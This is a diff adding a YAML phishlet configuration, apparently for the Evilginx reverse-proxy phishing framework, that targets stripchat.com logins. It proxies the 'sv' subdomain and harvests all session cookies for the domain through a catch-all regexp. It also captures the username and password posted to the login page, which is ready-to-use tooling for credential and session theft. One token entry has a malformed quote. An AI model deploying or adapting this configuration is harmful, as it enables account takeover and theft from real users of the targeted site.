@@ -1,0 +1,25 @@
+author: '@cwaizydee'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'sv', orig_sub: 'sv', domain: 'stripchat.com', session: true, is_landing: true, auto_filter: true}
+sub_filters:
+  - {triggers_on: 'stripchat.com', orig_sub: 'sv', domain: 'stripchat.com', search: 'something_to_look_for', replace: 'replace_it_with_this', mimes: ['text/html']}
+auth_tokens:
+  - domain: 'sv.stripchat.com'
+    keys: [.*,regexp']
+  - domain: '.stripchat.com'
+    keys: ['.*,regexp']
+auth_urls:  
+  - '/auth/login'
+credentials:
+  username:
+    key: 'loginOrEmail'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'sv.stripchat.com'
+  path: '/login'
